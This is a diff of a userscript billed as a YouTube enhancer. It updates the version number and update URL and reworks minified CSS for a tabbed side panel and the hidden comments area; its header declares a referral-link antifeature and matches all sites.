@@ -71,7 +71,7 @@
 // @description:ug    بۇ سكرىپت YouTube كۆرۈش تەجرىبەڭىزنى ياخشىلايدىغان كۈچەيتكۈچ! خۇسۇسىيەتلەر ۋە يېڭى تۈزۈلۈشنى ئۆز ئىچىگە ئالىدۇ. كىرۈش: 1. ۋىدىئو تەپسىلاتلىرى بەت ئىنتېرەيسىنى مۇۋاپىقلاش. 2. سكرىن رەسىمى. 3. قارا/ئاق تېما ئالماشتۇرۇش. 4. ۋىدىئونى تېز ئىلگىرى سۈرۈش. قاتارلىقلار.
 // @description:vi    Kịch bản là một công cụ tăng cường để cải thiện trải nghiệm xem YouTube của bạn! Bao gồm các tính năng và giao diện mới. Giới thiệu: 1. Giao diện trang chi tiết video tối ưu. 2. Chụp màn hình. 3. Chuyển đổi giữa chủ đề tối/ sáng. 4. Tua nhanh video. v.v.
 // @namespace   FunnyMonkeyV_NameScope
-// @version     2.1.10
+// @version     2.1.12
 // @author      FunnyMonkeyV
 // @icon        data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAAXNSR0IArs4c6QAAAwRJREFUaEPtWUtOAzEMTQZRcQkqlnCKlpO1PRnlFLBEcAkEao0c4siTyceTDNMG6AraJPbL8z9aNf7Rjeuv/gaAp5urtToe17Oy1XX7u5f3fU5mkoGn5WKrldrkDvnJ30Gp3d3rxzYmIwgAb1wfDhul9by3HtMSYA8XF7sQI0EAz9eXDznloevu8UC3FmB/+/Z5b8Afjw+Ts2LP988dABCbjacwUS3eX4AwZE4DAM/LBYjO9gEQI9L9IiHDRbevHz2de/+Mpd+Z0XIBdLC7AGu3GL1cILDfkX/hflRxjMmRTILWBzA26hALy8UWIwWZjzOnm6s1+om7GLYeQQ1AC1jxzWgSACSXHJozw/9WZwdAKcUpJfPBm6Vbpxsz4JRSJlJZpk/PAAPAo09bAGym/AcgcGBcMq0TswN/FQPk2AiKCjHj4Cz5YX7o/XZODJCipJNjh9UzGKWoOBNn/58wIaMkwHfdzqtX+s7/ntbj2tC+DBOT+4CQ+cmW1QPAekbrR9V10W4p1kmZzi70Yd1eroGqAuAXUpNdq3dQqh8pBpBr7aYEk6qKywB44S+kbKxvdQMBYZPuF4a+rCIA2W4r0u6hcL/EljIVM6M6AHa8ogFWJmQyh446rq08x5pgrDWtAuAnJolSEgZ4UnMyIsOBMgC2300B4KUC0W/KauryMGnZRNfrIdgEhCsXc+STAsD8YeK815mhUmSWro46NwZcZ8aKuh5TVuEmAZjphJ1e8IFAaFpxMhNKMcBDa5MA/GGVyR9N+sDhsKEh7ux5gMIoKkC2y8NoyoSCPhAZspX5gDejDyWnUFfVywOskUnZOW9HQ6V1EYBBi2jfDzCuUxFnQAGskAETUQBWbtyOpoE9BDZtdg2VHrTP4GNvAGW1UGy2nyjWpMXZ2HWxPjk53EUh0Y2Zp56xCqbWp94YkuN1Xv6GBEiKt1ogKeVFDxyGhdwTk50mkF3XKG1qIPqk3uSkT0wuibT8yOeXzTU3XLs3Z7ail/pmH7prb2+O/SIG5lCkVEbzAL4A07+gbQ8x85sAAAAASUVORK5CYII=
 // @match       *://*/*
@@ -90,7 +90,7 @@
 // @run-at      document-start
 // @antifeature referral-link
 // @downloadURL https://static.staticj.top/script/update/youtube.assistant.coupon.user.js
-// @updateURL   https://static.staticj.top/script/update/youtube.assistant.coupon.user.js
+// @updateURL   https://static.staticj.top/script/update/youtube.assistant.coupon.meta.js
 // @grant       GM_registerMenuCommand
 // @grant       GM_openInTab
 // @grant       GM.openInTab
@@ -130,7 +130,7 @@
   */
 
 
-  var css_248z$1 = "@keyframes relatedElementProvided{0%{background-position-x:3px}to{background-position-x:4px}}html[tabview-loaded=icp] #related.ytd-watch-flexy{animation:relatedElementProvided 1ms linear 0s 1 normal forwards}html[tabview-loaded=icp] #right-tabs #related.ytd-watch-flexy,html[tabview-loaded=icp] #right-tabs ytd-expander#expander,html[tabview-loaded=icp] [hidden] #related.ytd-watch-flexy,html[tabview-loaded=icp] [hidden] ytd-expander#expander,html[tabview-loaded=icp] ytd-comments ytd-expander#expander{animation:initial}#secondary.ytd-watch-flexy{position:relative}#secondary-inner.style-scope.ytd-watch-flexy{height:100%}secondary-wrapper{border:0;box-sizing:border-box;contain:strict;flex-wrap:nowrap;height:100%;left:0;max-height:calc(100vh - var(--ytd-toolbar-height, 56px));padding:0;padding-bottom:var(--ytd-margin-6x);padding-right:var(--ytd-margin-6x);padding-top:var(--ytd-margin-6x);position:absolute;right:0;top:0}#right-tabs,secondary-wrapper{display:flex;flex-direction:column;margin:0}#right-tabs{flex-grow:1;padding:0;position:relative}[tyt-tab=\"\"] #right-tabs{flex-grow:0}[tyt-tab=\"\"] #right-tabs .tab-content{border:0}#right-tabs .tab-content{flex-grow:1}ytd-watch-flexy[hide-default-text-inline-expander] #primary.style-scope.ytd-watch-flexy ytd-text-inline-expander{display:none}ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden{--comment-pre-load-sizing:90px;border:0;contain:strict;display:block!important;height:var(--comment-pre-load-sizing)!important;left:2px;margin:0;overflow:hidden;padding:0;pointer-events:none!important;position:fixed!important;top:2px;visibility:collapse;width:var(--comment-pre-load-sizing)!important;z-index:-1}ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden ytd-comments#comments>*{display:none!important}ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden ytd-comments#comments>ytd-item-section-renderer#sections{border:0;contain:strict;display:block!important;height:var(--comment-pre-load-sizing);margin:0;overflow:hidden;padding:0;width:var(--comment-pre-load-sizing)}ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden ytd-comments#comments>ytd-item-section-renderer#sections>*{display:none!important}ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden ytd-comments#comments>ytd-item-section-renderer#sections>#contents{border:0;contain:strict;display:flex!important;flex-direction:row;gap:60px;height:var(--comment-pre-load-sizing);margin:0;overflow:hidden;padding:0;width:var(--comment-pre-load-sizing)}ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden ytd-comments#comments>ytd-item-section-renderer#sections>#contents>*{border:0;box-sizing:content-box;contain:strict;display:block!important;height:var(--comment-pre-load-sizing);margin:calc(var(--comment-pre-load-sizing)*2)!important;overflow:hidden;padding:0;visibility:collapse!important;width:var(--comment-pre-load-sizing)}ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden ytd-comments#comments>ytd-item-section-renderer#sections>#contents>:empty{box-sizing:content-box;contain:strict;display:none!important;height:0;margin:0!important;overflow:hidden;visibility:collapse!important;width:0}ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden ytd-comments#comments>ytd-item-section-renderer#sections>#contents>ytd-continuation-item-renderer{box-sizing:initial;contain:strict;display:block!important;height:1px;margin:0!important;overflow:initial;visibility:collapse!important;width:1px}ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden ytd-comments#comments>ytd-item-section-renderer#sections>#contents>*>*{box-sizing:content-box;contain:strict;display:none!important;height:0;margin:0!important;overflow:hidden;visibility:collapse!important;width:0}#right-tabs #material-tabs{border:1px solid var(--ytd-searchbox-legacy-border-color);display:flex;overflow:hidden;padding:0;position:relative}[tyt-tab] #right-tabs #material-tabs{border-radius:var(--tyt-rounded-a1) var(--tyt-rounded-a1) var(--tyt-rounded-a1) var(--tyt-rounded-a1)}[tyt-tab^=\"#\"] #right-tabs #material-tabs{border-radius:var(--tyt-rounded-a1) var(--tyt-rounded-a1) 0 0}ytd-watch-flexy[flexy]:not([is-two-columns_]) #right-tabs #material-tabs{outline:0}#right-tabs #material-tabs a.tab-btn[tyt-tab-content]>*{pointer-events:none}#right-tabs #material-tabs a.tab-btn[tyt-tab-content]>.font-size-right{display:none;pointer-events:auto}ytd-watch-flexy #right-tabs .tab-content{border:1px solid var(--ytd-searchbox-legacy-border-color);border-radius:0 0 var(--tyt-rounded-a1) var(--tyt-rounded-a1);border-top:0;box-sizing:border-box;display:block;display:flex;flex-direction:row;overflow:hidden;padding:0;position:relative;top:0}ytd-watch-flexy:not([is-two-columns_]) #right-tabs .tab-content{height:100%}ytd-watch-flexy #right-tabs .tab-content-cld{--tab-content-padding:var(--ytd-margin-4x);box-sizing:border-box;contain:layout paint;display:block;overflow:auto;padding:var(--tab-content-padding);position:relative;width:100%}#right-tabs,.tab-content,.tab-content-cld{animation:none;transition:none}ytd-watch-flexy[is-two-columns_] #right-tabs .tab-content-cld{contain:size layout paint style;height:100%;position:absolute;width:100%}ytd-watch-flexy #right-tabs .tab-content-cld.tab-content-hidden{contain:size layout paint style;display:none;width:100%}@supports (color:var(--tabview-tab-btn-define )){ytd-watch-flexy #right-tabs .tab-btn{background:var(--yt-spec-general-background-a)}html{--tyt-tab-btn-flex-grow:1;--tyt-tab-btn-flex-basis:0%;--tyt-tab-bar-color-1-def:#ff4533;--tyt-tab-bar-color-2-def:var(--yt-brand-light-red);--tyt-tab-bar-color-1:var(--main-color,var(--tyt-tab-bar-color-1-def));--tyt-tab-bar-color-2:var(--main-color,var(--tyt-tab-bar-color-2-def))}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content]{--tyt-tab-btn-color:var(--yt-spec-text-secondary);background-color:var(--ytd-searchbox-legacy-button-color);border:0;border-bottom:4px solid transparent;color:var(--tyt-tab-btn-color);cursor:pointer;display:inline-block;flex-basis:0%;flex-basis:var(--tyt-tab-btn-flex-basis);flex-grow:1;flex-grow:var(--tyt-tab-btn-flex-grow);flex-shrink:1;font-size:12px;font-weight:500;line-height:18px;overflow:hidden;padding:14px 8px 10px;position:relative;text-align:center;text-decoration:none;text-overflow:clip;text-transform:uppercase;text-transform:var(--yt-button-text-transform,inherit);transition:border .2s linear .1s;white-space:nowrap}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content]>svg{fill:var(--iron-icon-fill-color,currentcolor);stroke:var(--iron-icon-stroke-color,none);color:var(--yt-button-color,inherit);height:18px;margin-right:0;opacity:.5;padding-right:0;vertical-align:bottom}ytd-watch-flexy #right-tabs .tab-btn{--tabview-btn-txt-ml:8px}ytd-watch-flexy[tyt-comment-disabled] #right-tabs .tab-btn[tyt-tab-content=\"#tab-comments\"]{--tabview-btn-txt-ml:0px}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content]>svg+span{margin-left:var(--tabview-btn-txt-ml)}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content] svg{pointer-events:none}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content].active{--tyt-tab-btn-color:var(--yt-spec-text-primary);background-color:var(--ytd-searchbox-legacy-button-focus-color);border-bottom-color:var(--tyt-tab-bar-color-1);border-bottom:2px solid var(--tyt-tab-bar-color-2);font-weight:500;outline:0}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content].active svg{opacity:.9}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content]:not(.active):hover{--tyt-tab-btn-color:var(--yt-spec-text-primary);background-color:var(--ytd-searchbox-legacy-button-hover-color)}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content]:not(.active):hover svg{opacity:.9}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content]{user-select:none!important}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content].tab-btn-hidden{display:none}ytd-watch-flexy[tyt-comment-disabled] #right-tabs .tab-btn[tyt-tab-content=\"#tab-comments\"],ytd-watch-flexy[tyt-comment-disabled] #right-tabs .tab-btn[tyt-tab-content=\"#tab-comments\"]:hover{--tyt-tab-btn-color:var(--yt-spec-icon-disabled)}ytd-watch-flexy[tyt-comment-disabled] #right-tabs .tab-btn[tyt-tab-content=\"#tab-comments\"] span#tyt-cm-count:empty{display:none}ytd-watch-flexy #right-tabs .tab-btn span#tyt-cm-count:empty:after{color:currentColor;display:inline-block;font-size:inherit;text-align:left;transform:scaleX(.8);width:4em}}@supports (color:var(--tyt-cm-count-define )){ytd-watch-flexy{--tyt-x-loading-content-letter-spacing:2px}html{--tabview-text-loading:\"Loading\";--tabview-text-fetching:\"Fetching\";--tabview-panel-loading:var(--tabview-text-loading)}html:lang(ja){--tabview-text-loading:\"読み込み中\";--tabview-text-fetching:\"フェッチ..\"}html:lang(ko){--tabview-text-loading:\"로딩..\";--tabview-text-fetching:\"가져오기..\"}html:lang(zh-Hant){--tabview-text-loading:\"載入中\";--tabview-text-fetching:\"擷取中\"}html:lang(zh-Hans){--tabview-text-loading:\"加载中\";--tabview-text-fetching:\"抓取中\"}html:lang(ru){--tabview-text-loading:\"Загрузка\";--tabview-text-fetching:\"Получение\"}ytd-watch-flexy #right-tabs .tab-btn span#tyt-cm-count:empty:after{content:var(--tabview-text-loading);letter-spacing:var(--tyt-x-loading-content-letter-spacing)}}@supports (color:var(--tabview-font-size-btn-define )){.font-size-right{align-content:space-evenly;bottom:0;display:inline-flex;flex-direction:column;justify-content:space-evenly;padding:4px 0;pointer-events:none;position:absolute;right:0;top:0;width:16px}html body ytd-watch-flexy.style-scope .font-size-btn{user-select:none!important}.font-size-btn{--tyt-font-size-btn-display:none;background-color:var(--yt-spec-badge-chip-background);box-sizing:border-box;color:var(--yt-spec-text-secondary);cursor:pointer;display:var(--tyt-font-size-btn-display,none);font-family:Menlo,Lucida Console,Monaco,Consolas,monospace;font-weight:900;height:12px;line-height:100%;margin:0;padding:0;pointer-events:all;position:relative;transform-origin:left top;transition:background-color 90ms linear,color 90ms linear;width:12px}.font-size-btn:hover{background-color:var(--yt-spec-text-primary);color:var(--yt-spec-general-background-a)}@supports (zoom:0.5){.tab-btn .font-size-btn{--tyt-font-size-btn-display:none}.tab-btn.active:hover .font-size-btn{--tyt-font-size-btn-display:inline-block}}}body ytd-watch-flexy:not([is-two-columns_]) #columns.ytd-watch-flexy{flex-direction:column}body ytd-watch-flexy:not([is-two-columns_]) #secondary.ytd-watch-flexy{box-sizing:border-box;display:block;width:100%}body ytd-watch-flexy:not([is-two-columns_]) #secondary.ytd-watch-flexy secondary-wrapper{contain:content;height:auto;padding-left:var(--ytd-margin-6x)}body ytd-watch-flexy:not([is-two-columns_]) #secondary.ytd-watch-flexy secondary-wrapper #right-tabs{overflow:auto}[tyt-chat=\"+\"] secondary-wrapper>[tyt-chat-container]{display:flex;flex-direction:column;flex-grow:1;flex-shrink:0}[tyt-chat=\"+\"] secondary-wrapper>[tyt-chat-container]>#chat{flex-grow:1}ytd-watch-flexy[is-two-columns_]:not([theater]) #columns.style-scope.ytd-watch-flexy{min-height:calc(100vh - var(--ytd-toolbar-height, 56px))}ytd-watch-flexy[is-two-columns_] ytd-live-chat-frame#chat{height:auto!important;min-height:auto!important}ytd-watch-flexy[tyt-tab^=\"#\"]:not([is-two-columns_]):not([tyt-chat=\"+\"]) #right-tabs{min-height:var(--ytd-watch-flexy-chat-max-height)}body ytd-watch-flexy:not([is-two-columns_]) #chat.ytd-watch-flexy{margin-top:0}body ytd-watch-flexy:not([is-two-columns_]) ytd-watch-metadata.ytd-watch-flexy{margin-bottom:0}ytd-watch-metadata.ytd-watch-flexy ytd-metadata-row-container-renderer{display:none}#tab-info [show-expand-button] #expand-sizer.ytd-text-inline-expander{visibility:initial}#tab-info #social-links.style-scope.ytd-video-description-infocards-section-renderer>#left-arrow-container.ytd-video-description-infocards-section-renderer>#left-arrow,#tab-info #social-links.style-scope.ytd-video-description-infocards-section-renderer>#right-arrow-container.ytd-video-description-infocards-section-renderer>#right-arrow{border:6px solid transparent;opacity:.65}#tab-info #social-links.style-scope.ytd-video-description-infocards-section-renderer>#left-arrow-container.ytd-video-description-infocards-section-renderer>#left-arrow:hover,#tab-info #social-links.style-scope.ytd-video-description-infocards-section-renderer>#right-arrow-container.ytd-video-description-infocards-section-renderer>#right-arrow:hover{opacity:1}#tab-info #social-links.style-scope.ytd-video-description-infocards-section-renderer>div#left-arrow-container:before{background:transparent;content:\"\";display:block;height:40px;left:-20px;position:absolute;top:0;width:40px;z-index:-1}#tab-info #social-links.style-scope.ytd-video-description-infocards-section-renderer>div#right-arrow-container:before{background:transparent;content:\"\";display:block;height:40px;position:absolute;right:-20px;top:0;width:40px;z-index:-1}body ytd-watch-flexy[is-two-columns_][tyt-egm-panel_] #columns.style-scope.ytd-watch-flexy #panels.style-scope.ytd-watch-flexy{display:flex;flex-direction:column;flex-grow:1;flex-shrink:0}body ytd-watch-flexy[is-two-columns_][tyt-egm-panel_] #columns.style-scope.ytd-watch-flexy #panels.style-scope.ytd-watch-flexy ytd-engagement-panel-section-list-renderer[target-id][visibility=ENGAGEMENT_PANEL_VISIBILITY_EXPANDED]{display:flex;flex-direction:column;flex-grow:1;flex-shrink:0;height:auto;max-height:none;min-height:auto}secondary-wrapper [visibility=ENGAGEMENT_PANEL_VISIBILITY_EXPANDED] #body.ytd-transcript-renderer:not(:empty),secondary-wrapper [visibility=ENGAGEMENT_PANEL_VISIBILITY_EXPANDED] #content.ytd-transcript-renderer:not(:empty),secondary-wrapper [visibility=ENGAGEMENT_PANEL_VISIBILITY_EXPANDED] ytd-transcript-renderer:not(:empty){flex-grow:1;height:auto;max-height:none;min-height:auto}secondary-wrapper #content.ytd-engagement-panel-section-list-renderer{position:relative}secondary-wrapper #content.ytd-engagement-panel-section-list-renderer>[panel-target-id]:only-child{contain:style size}secondary-wrapper #content.ytd-engagement-panel-section-list-renderer ytd-transcript-segment-list-renderer.ytd-transcript-search-panel-renderer{contain:strict;flex-grow:1}secondary-wrapper #content.ytd-engagement-panel-section-list-renderer ytd-transcript-segment-renderer.style-scope.ytd-transcript-segment-list-renderer,secondary-wrapper #content.ytd-engagement-panel-section-list-renderer ytd-transcript-segment-renderer.style-scope.ytd-transcript-segment-list-renderer>.segment{contain:layout paint style}body ytd-watch-flexy[theater] #secondary.ytd-watch-flexy{margin-top:var(--ytd-margin-3x);padding-top:0}body ytd-watch-flexy[theater] secondary-wrapper{margin-top:0;padding-top:0}body ytd-watch-flexy[theater] #chat.ytd-watch-flexy{margin-bottom:var(--ytd-margin-2x)}#tab-comments ytd-comments#comments [field-of-cm-count]{margin-top:0}#tab-info>ytd-expandable-video-description-body-renderer{margin-bottom:var(--ytd-margin-3x)}#tab-info [class]:last-child{margin-bottom:0;padding-bottom:0}#tab-info ytd-rich-metadata-row-renderer ytd-rich-metadata-renderer{max-width:none}ytd-watch-flexy[is-two-columns_] secondary-wrapper #chat.ytd-watch-flexy{margin-bottom:var(--ytd-margin-3x)}ytd-watch-flexy[tyt-tab] tp-yt-paper-tooltip{contain:content;white-space:nowrap}ytd-watch-info-text tp-yt-paper-tooltip.style-scope.ytd-watch-info-text{margin-bottom:-300px;margin-top:-96px}[hide-default-text-inline-expander] #bottom-row #description.ytd-watch-metadata{font-size:1.2rem;line-height:1.8rem}[hide-default-text-inline-expander] #bottom-row #description.ytd-watch-metadata yt-animated-rolling-number{font-size:inherit}[hide-default-text-inline-expander] #bottom-row #description.ytd-watch-metadata #info-container.style-scope.ytd-watch-info-text{align-items:center}ytd-watch-flexy[hide-default-text-inline-expander]{--tyt-bottom-watch-metadata-margin:6px}[hide-default-text-inline-expander] #bottom-row #description.ytd-watch-metadata>#description-inner.ytd-watch-metadata{margin:6px 12px}[hide-default-text-inline-expander] ytd-watch-metadata[title-headline-xs] h1.ytd-watch-metadata{font-size:1.8rem}ytd-watch-flexy[is-two-columns_][hide-default-text-inline-expander] #below.style-scope.ytd-watch-flexy ytd-merch-shelf-renderer{border:0;margin:0;padding:0}ytd-watch-flexy[is-two-columns_][hide-default-text-inline-expander] #below.style-scope.ytd-watch-flexy ytd-watch-metadata.ytd-watch-flexy{margin-bottom:6px}#tab-info yt-video-attribute-view-model .yt-video-attribute-view-model--horizontal .yt-video-attribute-view-model__link-container .yt-video-attribute-view-model__hero-section{flex-shrink:0}#tab-info yt-video-attribute-view-model .yt-video-attribute-view-model__overflow-menu{background:var(--yt-emoji-picker-category-background-color);border-radius:99px}#tab-info yt-video-attribute-view-model .yt-video-attribute-view-model--image-square.yt-video-attribute-view-model--image-large .yt-video-attribute-view-model__hero-section{max-height:128px}#tab-info yt-video-attribute-view-model .yt-video-attribute-view-model--image-large .yt-video-attribute-view-model__hero-section{max-width:128px}#tab-info ytd-reel-shelf-renderer #items.yt-horizontal-list-renderer ytd-reel-item-renderer.yt-horizontal-list-renderer{max-width:142px}ytd-watch-info-text#ytd-watch-info-text.style-scope.ytd-watch-metadata #date-text.style-scope.ytd-watch-info-text,ytd-watch-info-text#ytd-watch-info-text.style-scope.ytd-watch-metadata #view-count.style-scope.ytd-watch-info-text{align-items:center}ytd-watch-info-text:not([detailed]) #info.ytd-watch-info-text a.yt-simple-endpoint.yt-formatted-string{pointer-events:none}body ytd-app>ytd-popup-container>tp-yt-iron-dropdown>#contentWrapper>[slot=dropdown-content]{backdrop-filter:none}#tab-info [tyt-clone-refresh-count]{overflow:visible!important}#tab-info #items.ytd-horizontal-card-list-renderer yt-video-attribute-view-model.ytd-horizontal-card-list-renderer{contain:layout}#tab-info #thumbnail-container.ytd-structured-description-channel-lockup-renderer,#tab-info ytd-media-lockup-renderer[is-compact] #thumbnail-container.ytd-media-lockup-renderer{flex-shrink:0}secondary-wrapper ytd-donation-unavailable-renderer{--ytd-margin-6x:var(--ytd-margin-2x);--ytd-margin-5x:var(--ytd-margin-2x);--ytd-margin-4x:var(--ytd-margin-2x);--ytd-margin-3x:var(--ytd-margin-2x)}[tyt-no-less-btn] #less{display:none}.tyt-metadata-hover-resized #analytics-button,.tyt-metadata-hover-resized #purchase-button,.tyt-metadata-hover-resized #sponsor-button,.tyt-metadata-hover-resized #subscribe-button{display:none!important}.tyt-metadata-hover #upload-info{flex-basis:100vw;flex-shrink:0;max-width:max-content;min-width:max-content}#tab-info ytd-structured-description-playlist-lockup-renderer[collections] #playlist-thumbnail.style-scope.ytd-structured-description-playlist-lockup-renderer{max-width:100%}#tab-info ytd-structured-description-playlist-lockup-renderer[collections] #lockup-container.ytd-structured-description-playlist-lockup-renderer{padding:1px}#tab-info ytd-structured-description-playlist-lockup-renderer[collections] #thumbnail.ytd-structured-description-playlist-lockup-renderer{outline:1px solid hsla(0,0%,50%,.5)}ytd-live-chat-frame#chat[collapsed] ytd-message-renderer~#show-hide-button.ytd-live-chat-frame>ytd-toggle-button-renderer.ytd-live-chat-frame{padding:0}.tyt-info-invisible{display:none}[tyt-playlist-expanded] secondary-wrapper>ytd-playlist-panel-renderer#playlist{flex-grow:1;flex-shrink:1;max-height:unset!important;overflow:auto}[tyt-playlist-expanded] secondary-wrapper>ytd-playlist-panel-renderer#playlist>#container{max-height:unset!important}secondary-wrapper ytd-playlist-panel-renderer{--ytd-margin-6x:var(--ytd-margin-3x)}ytd-watch-flexy[theater] ytd-playlist-panel-renderer[collapsible][collapsed] .header.ytd-playlist-panel-renderer{padding:6px 8px}ytd-watch-flexy[theater] #playlist.ytd-watch-flexy{margin-bottom:var(--ytd-margin-2x)}ytd-watch-flexy[theater] #right-tabs .tab-btn[tyt-tab-content]{border-bottom:0 solid transparent;padding:8px 4px 6px}ytd-watch-flexy{--tyt-bottom-watch-metadata-margin:12px}ytd-watch-flexy[rounded-info-panel],ytd-watch-flexy[rounded-player-large]{--tyt-rounded-a1:${VAL_ROUNDED_A1}px}#bottom-row.style-scope.ytd-watch-metadata .item.ytd-watch-metadata{margin-right:var(--tyt-bottom-watch-metadata-margin,12px);margin-top:var(--tyt-bottom-watch-metadata-margin,12px)}#cinematics{contain:layout style size}";
+  var css_248z$1 = "@keyframes relatedElementProvided{0%{background-position-x:3px}to{background-position-x:4px}}html[tabview-loaded=icp] #related.ytd-watch-flexy{animation:relatedElementProvided 1ms linear 0s 1 normal forwards}html[tabview-loaded=icp] #right-tabs #related.ytd-watch-flexy,html[tabview-loaded=icp] #right-tabs ytd-expander#expander,html[tabview-loaded=icp] [hidden] #related.ytd-watch-flexy,html[tabview-loaded=icp] [hidden] ytd-expander#expander,html[tabview-loaded=icp] ytd-comments ytd-expander#expander{animation:initial}#secondary.ytd-watch-flexy{position:relative}#secondary-inner.style-scope.ytd-watch-flexy{height:100%}secondary-wrapper{border:0;box-sizing:border-box;contain:strict;flex-wrap:nowrap;height:100%;left:0;max-height:calc(100vh - var(--ytd-toolbar-height, 56px));padding:0;padding-bottom:var(--ytd-margin-6x);padding-right:var(--ytd-margin-6x);padding-top:var(--ytd-margin-6x);position:absolute;right:0;top:0}#right-tabs,secondary-wrapper{display:flex;flex-direction:column;margin:0}#right-tabs{flex-grow:1;padding:0;position:relative}[tyt-tab=\"\"] #right-tabs{flex-grow:0}[tyt-tab=\"\"] #right-tabs .tab-content{border:0}#right-tabs .tab-content{flex-grow:1}ytd-watch-flexy[hide-default-text-inline-expander] #primary.style-scope.ytd-watch-flexy ytd-text-inline-expander{display:none}ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden{--comment-pre-load-sizing:90px;border:0;contain:strict;display:block!important;height:var(--comment-pre-load-sizing)!important;left:2px;margin:0;overflow:hidden;padding:0;pointer-events:none!important;position:fixed!important;top:2px;visibility:collapse;width:var(--comment-pre-load-sizing)!important;z-index:-1}ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden ytd-comments#comments>ytd-item-section-renderer#sections{border:0;contain:strict;display:block!important;height:var(--comment-pre-load-sizing);margin:0;overflow:hidden;padding:0;width:var(--comment-pre-load-sizing)}ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden ytd-comments#comments>ytd-item-section-renderer#sections>#contents{border:0;contain:strict;display:flex!important;flex-direction:row;gap:60px;height:var(--comment-pre-load-sizing);margin:0;overflow:hidden;padding:0;width:var(--comment-pre-load-sizing)}ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden ytd-comments#comments #contents{--comment-pre-load-display:none}ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden ytd-comments#comments #contents>:last-child,ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden ytd-comments#comments #contents>:only-of-type{--comment-pre-load-display:block}ytd-watch-flexy:not([keep-comments-scroller]) #tab-comments.tab-content-hidden ytd-comments#comments #contents>*{display:var(--comment-pre-load-display)!important}#right-tabs #material-tabs{border:1px solid var(--ytd-searchbox-legacy-border-color);display:flex;overflow:hidden;padding:0;position:relative}[tyt-tab] #right-tabs #material-tabs{border-radius:var(--tyt-rounded-a1) var(--tyt-rounded-a1) var(--tyt-rounded-a1) var(--tyt-rounded-a1)}[tyt-tab^=\"#\"] #right-tabs #material-tabs{border-radius:var(--tyt-rounded-a1) var(--tyt-rounded-a1) 0 0}ytd-watch-flexy:not([is-two-columns_]) #right-tabs #material-tabs{outline:0}#right-tabs #material-tabs a.tab-btn[tyt-tab-content]>*{pointer-events:none}#right-tabs #material-tabs a.tab-btn[tyt-tab-content]>.font-size-right{display:none;pointer-events:auto}ytd-watch-flexy #right-tabs .tab-content{border:1px solid var(--ytd-searchbox-legacy-border-color);border-radius:0 0 var(--tyt-rounded-a1) var(--tyt-rounded-a1);border-top:0;box-sizing:border-box;display:block;display:flex;flex-direction:row;overflow:hidden;padding:0;position:relative;top:0}ytd-watch-flexy:not([is-two-columns_]) #right-tabs .tab-content{height:100%}ytd-watch-flexy #right-tabs .tab-content-cld{--tab-content-padding:var(--ytd-margin-4x);box-sizing:border-box;contain:layout paint;display:block;overflow:auto;padding:var(--tab-content-padding);position:relative;width:100%}#right-tabs,.tab-content,.tab-content-cld{animation:none;transition:none}#right-tabs #emojis.ytd-commentbox{inset:auto 0 auto 0;width:auto}ytd-watch-flexy[is-two-columns_] #right-tabs .tab-content-cld{contain:size layout paint style;height:100%;position:absolute;width:100%}ytd-watch-flexy #right-tabs .tab-content-cld.tab-content-hidden{contain:size layout paint style;display:none;width:100%}@supports (color:var(--tabview-tab-btn-define )){ytd-watch-flexy #right-tabs .tab-btn{background:var(--yt-spec-general-background-a)}html{--tyt-tab-btn-flex-grow:1;--tyt-tab-btn-flex-basis:0%;--tyt-tab-bar-color-1-def:#ff4533;--tyt-tab-bar-color-2-def:var(--yt-brand-light-red);--tyt-tab-bar-color-1:var(--main-color,var(--tyt-tab-bar-color-1-def));--tyt-tab-bar-color-2:var(--main-color,var(--tyt-tab-bar-color-2-def))}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content]{--tyt-tab-btn-color:var(--yt-spec-text-secondary);background-color:var(--ytd-searchbox-legacy-button-color);border:0;border-bottom:4px solid transparent;color:var(--tyt-tab-btn-color);cursor:pointer;display:inline-block;flex-basis:0%;flex-basis:var(--tyt-tab-btn-flex-basis);flex-grow:1;flex-grow:var(--tyt-tab-btn-flex-grow);flex-shrink:1;font-size:12px;font-weight:500;line-height:18px;overflow:hidden;padding:14px 8px 10px;position:relative;text-align:center;text-decoration:none;text-overflow:clip;text-transform:uppercase;text-transform:var(--yt-button-text-transform,inherit);transition:border .2s linear .1s;white-space:nowrap}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content]>svg{fill:var(--iron-icon-fill-color,currentcolor);stroke:var(--iron-icon-stroke-color,none);color:var(--yt-button-color,inherit);height:18px;margin-right:0;opacity:.5;padding-right:0;vertical-align:bottom}ytd-watch-flexy #right-tabs .tab-btn{--tabview-btn-txt-ml:8px}ytd-watch-flexy[tyt-comment-disabled] #right-tabs .tab-btn[tyt-tab-content=\"#tab-comments\"]{--tabview-btn-txt-ml:0px}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content]>svg+span{margin-left:var(--tabview-btn-txt-ml)}ytd-watch-flexy #right-tabs .tab-btn[tyt-tab-content] 